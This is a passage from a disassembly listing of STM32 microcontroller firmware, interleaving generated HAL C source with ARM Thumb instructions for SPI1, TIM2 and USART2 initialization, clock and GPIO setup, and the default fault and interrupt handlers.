 8000ea2:	2208      	movs	r2, #8
 8000ea4:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000ea6:	4805      	ldr	r0, [pc, #20]	; (8000ebc <MX_SPI1_Init+0x74>)
 8000ea8:	f003 ff14 	bl	8004cd4 <HAL_SPI_Init>
 8000eac:	4603      	mov	r3, r0
 8000eae:	2b00      	cmp	r3, #0
 8000eb0:	d001      	beq.n	8000eb6 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000eb2:	f7ff ffc3 	bl	8000e3c <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000eb6:	bf00      	nop
 8000eb8:	bd80      	pop	{r7, pc}
 8000eba:	bf00      	nop
 8000ebc:	20000280 	.word	0x20000280
 8000ec0:	40013000 	.word	0x40013000

08000ec4 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000ec4:	b580      	push	{r7, lr}
 8000ec6:	b08a      	sub	sp, #40	; 0x28
 8000ec8:	af00      	add	r7, sp, #0
 8000eca:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000ecc:	f107 0314 	add.w	r3, r7, #20
 8000ed0:	2200      	movs	r2, #0
 8000ed2:	601a      	str	r2, [r3, #0]
 8000ed4:	605a      	str	r2, [r3, #4]
 8000ed6:	609a      	str	r2, [r3, #8]
 8000ed8:	60da      	str	r2, [r3, #12]
 8000eda:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000edc:	687b      	ldr	r3, [r7, #4]
 8000ede:	681b      	ldr	r3, [r3, #0]
 8000ee0:	4a17      	ldr	r2, [pc, #92]	; (8000f40 <HAL_SPI_MspInit+0x7c>)
 8000ee2:	4293      	cmp	r3, r2
 8000ee4:	d128      	bne.n	8000f38 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000ee6:	4b17      	ldr	r3, [pc, #92]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000ee8:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000eea:	4a16      	ldr	r2, [pc, #88]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000eec:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000ef0:	6613      	str	r3, [r2, #96]	; 0x60
 8000ef2:	4b14      	ldr	r3, [pc, #80]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000ef4:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000ef6:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000efa:	613b      	str	r3, [r7, #16]
 8000efc:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000efe:	4b11      	ldr	r3, [pc, #68]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000f00:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f02:	4a10      	ldr	r2, [pc, #64]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000f04:	f043 0301 	orr.w	r3, r3, #1
 8000f08:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000f0a:	4b0e      	ldr	r3, [pc, #56]	; (8000f44 <HAL_SPI_MspInit+0x80>)
 8000f0c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000f0e:	f003 0301 	and.w	r3, r3, #1
 8000f12:	60fb      	str	r3, [r7, #12]
 8000f14:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000f16:	23c2      	movs	r3, #194	; 0xc2
 8000f18:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000f1a:	2302      	movs	r3, #2
 8000f1c:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000f1e:	2300      	movs	r3, #0
 8000f20:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000f22:	2303      	movs	r3, #3
 8000f24:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000f26:	2305      	movs	r3, #5
 8000f28:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000f2a:	f107 0314 	add.w	r3, r7, #20
 8000f2e:	4619      	mov	r1, r3
 8000f30:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000f34:	f000 fdd4 	bl	8001ae0 <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000f38:	bf00      	nop
 8000f3a:	3728      	adds	r7, #40	; 0x28
 8000f3c:	46bd      	mov	sp, r7
 8000f3e:	bd80      	pop	{r7, pc}
 8000f40:	40013000 	.word	0x40013000
 8000f44:	40021000 	.word	0x40021000

08000f48 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000f48:	b480      	push	{r7}
 8000f4a:	b083      	sub	sp, #12
 8000f4c:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000f4e:	4b0f      	ldr	r3, [pc, #60]	; (8000f8c <HAL_MspInit+0x44>)
 8000f50:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f52:	4a0e      	ldr	r2, [pc, #56]	; (8000f8c <HAL_MspInit+0x44>)
 8000f54:	f043 0301 	orr.w	r3, r3, #1
 8000f58:	6613      	str	r3, [r2, #96]	; 0x60
 8000f5a:	4b0c      	ldr	r3, [pc, #48]	; (8000f8c <HAL_MspInit+0x44>)
 8000f5c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000f5e:	f003 0301 	and.w	r3, r3, #1
 8000f62:	607b      	str	r3, [r7, #4]
 8000f64:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000f66:	4b09      	ldr	r3, [pc, #36]	; (8000f8c <HAL_MspInit+0x44>)
 8000f68:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f6a:	4a08      	ldr	r2, [pc, #32]	; (8000f8c <HAL_MspInit+0x44>)
 8000f6c:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000f70:	6593      	str	r3, [r2, #88]	; 0x58
 8000f72:	4b06      	ldr	r3, [pc, #24]	; (8000f8c <HAL_MspInit+0x44>)
 8000f74:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f76:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000f7a:	603b      	str	r3, [r7, #0]
 8000f7c:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000f7e:	bf00      	nop
 8000f80:	370c      	adds	r7, #12
 8000f82:	46bd      	mov	sp, r7
 8000f84:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000f88:	4770      	bx	lr
 8000f8a:	bf00      	nop
 8000f8c:	40021000 	.word	0x40021000

08000f90 <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000f90:	b480      	push	{r7}
 8000f92:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000f94:	e7fe      	b.n	8000f94 <NMI_Handler+0x4>

08000f96 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000f96:	b480      	push	{r7}
 8000f98:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000f9a:	e7fe      	b.n	8000f9a <HardFault_Handler+0x4>

08000f9c <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000f9c:	b480      	push	{r7}
 8000f9e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000fa0:	e7fe      	b.n	8000fa0 <MemManage_Handler+0x4>

08000fa2 <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000fa2:	b480      	push	{r7}
 8000fa4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000fa6:	e7fe      	b.n	8000fa6 <BusFault_Handler+0x4>

08000fa8 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000fa8:	b480      	push	{r7}
 8000faa:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000fac:	e7fe      	b.n	8000fac <UsageFault_Handler+0x4>

08000fae <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000fae:	b480      	push	{r7}
 8000fb0:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000fb2:	bf00      	nop
 8000fb4:	46bd      	mov	sp, r7
 8000fb6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fba:	4770      	bx	lr

08000fbc <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000fbc:	b480      	push	{r7}
 8000fbe:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000fc0:	bf00      	nop
 8000fc2:	46bd      	mov	sp, r7
 8000fc4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fc8:	4770      	bx	lr

08000fca <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000fca:	b480      	push	{r7}
 8000fcc:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000fce:	bf00      	nop
 8000fd0:	46bd      	mov	sp, r7
 8000fd2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000fd6:	4770      	bx	lr

08000fd8 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000fd8:	b580      	push	{r7, lr}
 8000fda:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000fdc:	f000 f9b2 	bl	8001344 <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000fe0:	bf00      	nop
 8000fe2:	bd80      	pop	{r7, pc}

08000fe4 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000fe4:	b580      	push	{r7, lr}
 8000fe6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000fe8:	4802      	ldr	r0, [pc, #8]	; (8000ff4 <TIM2_IRQHandler+0x10>)
 8000fea:	f003 ffc1 	bl	8004f70 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000fee:	bf00      	nop
 8000ff0:	bd80      	pop	{r7, pc}
 8000ff2:	bf00      	nop
 8000ff4:	200002e4 	.word	0x200002e4

08000ff8 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000ff8:	b580      	push	{r7, lr}
 8000ffa:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000ffc:	4802      	ldr	r0, [pc, #8]	; (8001008 <USB_IRQHandler+0x10>)
 8000ffe:	f001 f819 	bl	8002034 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8001002:	bf00      	nop
 8001004:	bd80      	pop	{r7, pc}
 8001006:	bf00      	nop
 8001008:	20000b7c 	.word	0x20000b7c

0800100c <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 800100c:	b480      	push	{r7}
 800100e:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8001010:	4b06      	ldr	r3, [pc, #24]	; (800102c <SystemInit+0x20>)
 8001012:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8001016:	4a05      	ldr	r2, [pc, #20]	; (800102c <SystemInit+0x20>)
 8001018:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 800101c:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8001020:	bf00      	nop
 8001022:	46bd      	mov	sp, r7
 8001024:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001028:	4770      	bx	lr
 800102a:	bf00      	nop
 800102c:	e000ed00 	.word	0xe000ed00

08001030 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8001030:	b580      	push	{r7, lr}
 8001032:	b088      	sub	sp, #32
 8001034:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8001036:	f107 0310 	add.w	r3, r7, #16
 800103a:	2200      	movs	r2, #0
 800103c:	601a      	str	r2, [r3, #0]
 800103e:	605a      	str	r2, [r3, #4]
 8001040:	609a      	str	r2, [r3, #8]
 8001042:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8001044:	1d3b      	adds	r3, r7, #4
 8001046:	2200      	movs	r2, #0
 8001048:	601a      	str	r2, [r3, #0]
 800104a:	605a      	str	r2, [r3, #4]
 800104c:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 800104e:	4b1e      	ldr	r3, [pc, #120]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001050:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8001054:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8001056:	4b1c      	ldr	r3, [pc, #112]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001058:	f641 421f 	movw	r2, #7199	; 0x1c1f
 800105c:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 800105e:	4b1a      	ldr	r3, [pc, #104]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001060:	2200      	movs	r2, #0
 8001062:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8001064:	4b18      	ldr	r3, [pc, #96]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001066:	f240 128f 	movw	r2, #399	; 0x18f
 800106a:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 800106c:	4b16      	ldr	r3, [pc, #88]	; (80010c8 <MX_TIM2_Init+0x98>)
 800106e:	2200      	movs	r2, #0
 8001070:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8001072:	4b15      	ldr	r3, [pc, #84]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001074:	2200      	movs	r2, #0
 8001076:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8001078:	4813      	ldr	r0, [pc, #76]	; (80010c8 <MX_TIM2_Init+0x98>)
 800107a:	f003 fece 	bl	8004e1a <HAL_TIM_Base_Init>
 800107e:	4603      	mov	r3, r0
 8001080:	2b00      	cmp	r3, #0
 8001082:	d001      	beq.n	8001088 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8001084:	f7ff feda 	bl	8000e3c <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8001088:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 800108c:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 800108e:	f107 0310 	add.w	r3, r7, #16
 8001092:	4619      	mov	r1, r3
 8001094:	480c      	ldr	r0, [pc, #48]	; (80010c8 <MX_TIM2_Init+0x98>)
 8001096:	f004 f86d 	bl	8005174 <HAL_TIM_ConfigClockSource>
 800109a:	4603      	mov	r3, r0
 800109c:	2b00      	cmp	r3, #0
 800109e:	d001      	beq.n	80010a4 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 80010a0:	f7ff fecc 	bl	8000e3c <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 80010a4:	2300      	movs	r3, #0
 80010a6:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 80010a8:	2300      	movs	r3, #0
 80010aa:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 80010ac:	1d3b      	adds	r3, r7, #4
 80010ae:	4619      	mov	r1, r3
 80010b0:	4805      	ldr	r0, [pc, #20]	; (80010c8 <MX_TIM2_Init+0x98>)
 80010b2:	f004 fa4f 	bl	8005554 <HAL_TIMEx_MasterConfigSynchronization>
 80010b6:	4603      	mov	r3, r0
 80010b8:	2b00      	cmp	r3, #0
 80010ba:	d001      	beq.n	80010c0 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 80010bc:	f7ff febe 	bl	8000e3c <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 80010c0:	bf00      	nop
 80010c2:	3720      	adds	r7, #32
 80010c4:	46bd      	mov	sp, r7
 80010c6:	bd80      	pop	{r7, pc}
 80010c8:	200002e4 	.word	0x200002e4

080010cc <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 80010cc:	b580      	push	{r7, lr}
 80010ce:	b084      	sub	sp, #16
 80010d0:	af00      	add	r7, sp, #0
 80010d2:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 80010d4:	687b      	ldr	r3, [r7, #4]
 80010d6:	681b      	ldr	r3, [r3, #0]
 80010d8:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80010dc:	d113      	bne.n	8001106 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 80010de:	4b0c      	ldr	r3, [pc, #48]	; (8001110 <HAL_TIM_Base_MspInit+0x44>)
 80010e0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80010e2:	4a0b      	ldr	r2, [pc, #44]	; (8001110 <HAL_TIM_Base_MspInit+0x44>)
 80010e4:	f043 0301 	orr.w	r3, r3, #1
 80010e8:	6593      	str	r3, [r2, #88]	; 0x58
 80010ea:	4b09      	ldr	r3, [pc, #36]	; (8001110 <HAL_TIM_Base_MspInit+0x44>)
 80010ec:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80010ee:	f003 0301 	and.w	r3, r3, #1
 80010f2:	60fb      	str	r3, [r7, #12]
 80010f4:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 80010f6:	2200      	movs	r2, #0
 80010f8:	2100      	movs	r1, #0
 80010fa:	201c      	movs	r0, #28
 80010fc:	f000 fa41 	bl	8001582 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8001100:	201c      	movs	r0, #28
 8001102:	f000 fa5a 	bl	80015ba <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8001106:	bf00      	nop
 8001108:	3710      	adds	r7, #16
 800110a:	46bd      	mov	sp, r7
 800110c:	bd80      	pop	{r7, pc}
 800110e:	bf00      	nop
 8001110:	40021000 	.word	0x40021000

08001114 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8001114:	b580      	push	{r7, lr}
 8001116:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8001118:	4b14      	ldr	r3, [pc, #80]	; (800116c <MX_USART2_UART_Init+0x58>)
 800111a:	4a15      	ldr	r2, [pc, #84]	; (8001170 <MX_USART2_UART_Init+0x5c>)
 800111c:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 800111e:	4b13      	ldr	r3, [pc, #76]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001120:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8001124:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8001126:	4b11      	ldr	r3, [pc, #68]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001128:	2200      	movs	r2, #0
 800112a:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 800112c:	4b0f      	ldr	r3, [pc, #60]	; (800116c <MX_USART2_UART_Init+0x58>)
 800112e:	2200      	movs	r2, #0
 8001130:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8001132:	4b0e      	ldr	r3, [pc, #56]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001134:	2200      	movs	r2, #0
 8001136:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8001138:	4b0c      	ldr	r3, [pc, #48]	; (800116c <MX_USART2_UART_Init+0x58>)
 800113a:	220c      	movs	r2, #12
 800113c:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 800113e:	4b0b      	ldr	r3, [pc, #44]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001140:	2200      	movs	r2, #0
 8001142:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8001144:	4b09      	ldr	r3, [pc, #36]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001146:	2200      	movs	r2, #0
 8001148:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 800114a:	4b08      	ldr	r3, [pc, #32]	; (800116c <MX_USART2_UART_Init+0x58>)
 800114c:	2200      	movs	r2, #0
 800114e:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8001150:	4b06      	ldr	r3, [pc, #24]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001152:	2200      	movs	r2, #0
 8001154:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8001156:	4805      	ldr	r0, [pc, #20]	; (800116c <MX_USART2_UART_Init+0x58>)
 8001158:	f004 fa80 	bl	800565c <HAL_UART_Init>
 800115c:	4603      	mov	r3, r0
 800115e:	2b00      	cmp	r3, #0
 8001160:	d001      	beq.n	8001166 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8001162:	f7ff fe6b 	bl	8000e3c <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8001166:	bf00      	nop
 8001168:	bd80      	pop	{r7, pc}
 800116a:	bf00      	nop
 800116c:	20000330 	.word	0x20000330
 8001170:	40004400 	.word	0x40004400

08001174 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8001174:	b580      	push	{r7, lr}
 8001176:	b09e      	sub	sp, #120	; 0x78
 8001178:	af00      	add	r7, sp, #0
 800117a:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 800117c:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001180:	2200      	movs	r2, #0
 8001182:	601a      	str	r2, [r3, #0]
 8001184:	605a      	str	r2, [r3, #4]
 8001186:	609a      	str	r2, [r3, #8]
 8001188:	60da      	str	r2, [r3, #12]
 800118a:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800118c:	f107 0310 	add.w	r3, r7, #16
 8001190:	2254      	movs	r2, #84	; 0x54
 8001192:	2100      	movs	r1, #0
 8001194:	4618      	mov	r0, r3
 8001196:	f00b ffff 	bl	800d198 <memset>
  if(uartHandle->Instance==USART2)
 800119a:	687b      	ldr	r3, [r7, #4]
 800119c:	681b      	ldr	r3, [r3, #0]
 800119e:	4a28      	ldr	r2, [pc, #160]	; (8001240 <HAL_UART_MspInit+0xcc>)
 80011a0:	4293      	cmp	r3, r2
 80011a2:	d148      	bne.n	8001236 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 80011a4:	2302      	movs	r3, #2
 80011a6:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 80011a8:	2300      	movs	r3, #0
 80011aa:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 80011ac:	f107 0310 	add.w	r3, r7, #16
 80011b0:	4618      	mov	r0, r3
 80011b2:	f003 fa97 	bl	80046e4 <HAL_RCCEx_PeriphCLKConfig>
 80011b6:	4603      	mov	r3, r0
 80011b8:	2b00      	cmp	r3, #0
 80011ba:	d001      	beq.n	80011c0 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 80011bc:	f7ff fe3e 	bl	8000e3c <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 80011c0:	4b20      	ldr	r3, [pc, #128]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011c2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011c4:	4a1f      	ldr	r2, [pc, #124]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011c6:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 80011ca:	6593      	str	r3, [r2, #88]	; 0x58
 80011cc:	4b1d      	ldr	r3, [pc, #116]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011ce:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80011d0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80011d4:	60fb      	str	r3, [r7, #12]
 80011d6:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 80011d8:	4b1a      	ldr	r3, [pc, #104]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011da:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80011dc:	4a19      	ldr	r2, [pc, #100]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011de:	f043 0301 	orr.w	r3, r3, #1
 80011e2:	64d3      	str	r3, [r2, #76]	; 0x4c
 80011e4:	4b17      	ldr	r3, [pc, #92]	; (8001244 <HAL_UART_MspInit+0xd0>)
 80011e6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80011e8:	f003 0301 	and.w	r3, r3, #1
 80011ec:	60bb      	str	r3, [r7, #8]
 80011ee:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 80011f0:	2304      	movs	r3, #4
 80011f2:	667b      	str	r3, [r7, #100]	; 0x64
